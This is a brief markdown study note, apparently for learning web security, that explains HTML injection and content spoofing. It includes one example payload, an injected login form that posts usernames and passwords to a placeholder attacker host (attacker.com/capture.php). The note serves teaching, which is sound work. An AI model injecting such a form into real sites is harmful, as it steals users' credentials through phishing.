# HTML INJECTION AND CONTENT SPOOFING

- It allows malicious user to inject content into a site's web page
- Most commonly they inject in <form> tag
- This attack rely on fooling targets(sometimes called social engineering)
- This both vulnerability are less severe than other vulnerabilities

# HTML Injection
- It occurs when attacker submit HTML tags via some form input or URL parameter
- It is sometimes referred as virtual defacement
- Example
    - Rendering page content that you can control adding form asking user to re-enter username and password
        ```
        <form method="POST" action="http://attacker.com/capture.php" id="login-form">
            <input type="text" name="username">
            <input type="password" name="password">
            <input type="submit" value="Submit">
        </form>
        ```